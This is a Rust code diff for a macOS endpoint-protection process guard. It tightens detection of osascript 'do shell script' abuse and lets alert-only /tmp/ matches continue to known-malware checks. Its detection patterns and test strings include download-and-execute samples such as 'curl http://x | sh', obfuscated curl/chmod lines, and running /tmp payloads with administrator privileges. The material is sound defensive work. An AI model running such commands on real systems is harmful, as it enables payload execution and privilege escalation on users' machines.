@@ -106,19 +106,50 @@ fn osascript_abuse(normalized: &str) -> Option<&'static str> {
     if normalized.contains("hidden answer") {
         return Some(OSASCRIPT_PASSWORD_PROMPT);
     }
-    let fetches = ["curl ", "wget ", "base64", "chmod +x"]
-        .iter()
-        .any(|needle| normalized.contains(needle));
+    let has = |needles: &[&str]| needles.iter().any(|needle| normalized.contains(needle));
     // "doshellscript" is the same call from JavaScript for Automation (osascript -l JavaScript).
-    let runs_shell = normalized.contains("do shell script") || normalized.contains("doshellscript");
-    if !runs_shell {
+    if !has(&["do shell script", "doshellscript"]) {
         return None;
     }
-    if fetches {
+    if has(&["curl ", "wget ", "base64", "chmod +x"]) {
+        return Some(OSASCRIPT_SHELL_FETCH);
+    }
+    if !has(&["/tmp/"]) {
+        return None;
+    }
+    // A /tmp/ path is only alert-only on its own (installers do that, and so does a shell
+    // wrapper that redirects `pwd -P >| /tmp/x`). It is a stop with any of these next to it;
+    // `with administrator privileges` counts only when something is also run from /tmp (the
+    // wrapper may carry our own installer's prompt), so a bare `do shell script "/tmp/x"` or
+    // the wrapper stays alert-only. shortcut: matched as plain words, so a harmless line that
+    // mentions curl/wget/chmod/xattr - next to a /tmp/ path is stopped, and a command run from
+    // /tmp/ only through `(`-glued JavaScript syntax is not seen as "run".
+    let (interpreter, direct) = runs_from_tmp(normalized);
+    let stronger = has(&["chmod", "curl", "wget", "xattr -", "openssl enc"]) || interpreter;
+    let admin = has(&["with administrator privileges"]) && (interpreter || direct);
+    if stronger || admin {
         Some(OSASCRIPT_SHELL_FETCH)
     } else {
-        normalized.contains("/tmp/").then_some(OSASCRIPT_TMP_PATH)
+        Some(OSASCRIPT_TMP_PATH)
     }
+}
+
+/// (an interpreter such as `sh`/`python3` given a /tmp/ file, a /tmp/ file run directly)
+fn runs_from_tmp(normalized: &str) -> (bool, bool) {
+    let tokens: Vec<&str> = normalized.split(' ').collect();
+    let (mut interpreter, mut direct) = (false, false);
+    for pair in tokens.windows(2) {
+        if !(pair[1].starts_with("/tmp/") || pair[1].starts_with("/private/tmp/")) {
+            continue;
+        }
+        let before = pair[0].rsplit('/').next().unwrap_or(pair[0]);
+        if matches!(before, "sh" | "bash" | "zsh" | "dash") || before.starts_with("python") {
+            interpreter = true;
+        } else if matches!(before, "script" | "&&" | "||") || before.ends_with(';') {
+            direct = true;
+        }
+    }
+    (interpreter, direct)
 }
 
 /// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
@@ -166,13 +197,16 @@ pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static st
     if curl_piped_to_shell(&normalized) {
         return Some(CURL_PIPE_SHELL);
     }
-    if let Some(abuse) = osascript_abuse(&normalized) {
-        return Some(abuse);
+    // The alert-only result is the weakest: it is returned only when no other rule matched.
+    let abuse = osascript_abuse(&normalized);
+    if abuse.is_some_and(|a| !is_alert_only(a)) {
+        return abuse;
     }
     MACOS_LOTL_PATTERNS
         .iter()
         .copied()
         .find(|pattern| normalized.contains(pattern))
+        .or(abuse)
 }
 
 /// Both rule sets: Windows script hosts and macOS shells/interpreters have disjoint names.
@@ -362,7 +396,8 @@ impl ProcessGuard {
         let cmdline = command_line(process);
         if let Some(pattern) = check_lotl_command(&name, &cmdline) {
             self.respond_lotl(pid, &name, &cmdline, pattern);
-            return true;
+            // An alert-only match proves nothing: the program must still reach the list and AI checks.
+            return !is_alert_only(pattern);
         }
         false
     }
@@ -828,6 +863,110 @@ mod tests {
         assert!(!is_alert_only(found.unwrap()));
         // /tmp/ without a shell call is still nothing.
         assert_eq!(match_lotl_macos("osascript", "osascript /tmp/a.scpt"), None);
+    }
+
+    #[test]
+    fn a_stronger_rule_wins_over_the_tmp_alert_and_old_kills_stay_kills() {
+        let kill = |name: &str, line: &str| {
+            let found = match_lotl_macos(name, line);
+            assert!(
+                found.is_some_and(|f| !is_alert_only(f)),
+                "{line}: {found:?}"
+            );
+        };
+        kill(
+            "osascript",
+            "osascript -e 'do shell script \"launchctl load /tmp/x.plist\"'",
+        );
+        kill(
+            "sh",
+            "sh -c 'launchctl load x.plist # osascript do shell script /tmp/'",
+        );
+        kill(
+            "sh",
+            "sh -c 'curl http://x | sh # osascript do shell script /tmp/'",
+        );
+        for line in [
+            "do shell script \"chmod 755 /tmp/p\"",
+            "do shell script \"ch''mod u+x /tmp/p\"",
+            "do shell script \"curl${IFS}http://x -o /tmp/p\"",
+            "do shell script \"wget${IFS}http://x -O /tmp/p\"",
+            "do shell script \"xattr -c /tmp/p\"",
+            "do shell script \"openssl enc -d -in /tmp/p\"",
+            "do shell script \"python3 /tmp/p.py\"",
+            "do shell script \"/bin/bash /tmp/p.sh\"",
+            "do shell script \"zsh /tmp/p\"",
+            "do shell script \"/tmp/p\" with administrator privileges",
+            "do shell script \"sh /tmp/p\" with administrator privileges",
+        ] {
+            kill("osascript", &format!("osascript -e '{line}'"));
+        }
+        // Only a bare mention, or the benign shell wrapper, is reported but not stopped.
+        for line in [
+            "osascript -e 'do shell script \"/tmp/helper --setup\"'",
+            "zsh -c eval 'osascript -e do shell script id' < /dev/null && pwd -P >| /tmp/claude-1-cwd",
+            "zsh -c osascript -e 'do shell script \"id\" with administrator privileges' && pwd -P >| /tmp/claude-1-cwd",
+        ] {
+            assert_eq!(match_lotl_macos("zsh", line), Some(OSASCRIPT_TMP_PATH), "{line}");
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn an_alert_only_command_line_still_reaches_the_known_malware_check() {
+        let dir = std::env::temp_dir().join(format!("thenex-pg-alertonly-{}", std::process::id()));
+        let _ = fs::remove_dir_all(&dir);
+        fs::create_dir_all(&dir).unwrap();
+        let dir = fs::canonicalize(&dir).unwrap();
+        let exe = dir.join("osascript");
+        fs::copy(std::env::current_exe().unwrap(), &exe).unwrap();
+        let mut cfg = AppConfig::for_base_dir(&dir.join("base"));
+        cfg.ensure_dirs().unwrap();
+        let digest = known_bad::hash_file(&exe, u64::MAX).unwrap();
+        let list = dir.join("list.bin");
+        known_bad::write_list(&list, &[digest], 1_795_000_000).unwrap();
+        cfg.hash_list = Some(list);
+        cfg.load_known_bad().unwrap();
+        let cfg = Arc::new(cfg);
+        let mut g = ProcessGuard::new(
+            Arc::clone(&cfg),
+            Arc::new(BinaryAiScanner::heuristic_only()),
+            Arc::new(Telemetry::default()),
+        );
+        // The copy only runs `napper` (extra words are just more test-name filters).
+        let mut child = std::process::Command::new(&exe)
+            .args(["--ignored", "--exact", "process_guard::tests::napper"])
+            .args(["do", "shell", "script", "/tmp/helper"])
+            .env("THENEX_TEST_NAP", "1")
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn()
+            .unwrap();
+        let pid = Pid::from_u32(child.id());
+        g.sys
+            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
+        let done = g.inspect_command(pid);
+        assert!(!done, "an alert-only match must not end the checks");
+        g.inspect_binary(pid, false);
+        let actions: Vec<String> = quarantine::read_recent_events(&cfg.events_log, 1 << 20)
+            .unwrap()
+            .into_iter()
+            .map(|e| format!("{}: {}", e.threat_type, e.action_taken))
+            .collect();
+        assert!(
+            actions
+                .iter()
+                .any(|a| a.starts_with("LOTL_SCRIPT: ALERT_ONLY")),
+            "{actions:?}"
+        );
+        assert!(
+            actions
+                .iter()
+                .any(|a| a.starts_with("KNOWN_MALWARE: TERMINATED")),
+            "{actions:?}"
+        );
+        assert!(child.wait().is_ok());
+        let _ = fs::remove_dir_all(&dir);
     }
 
     #[cfg(unix)]
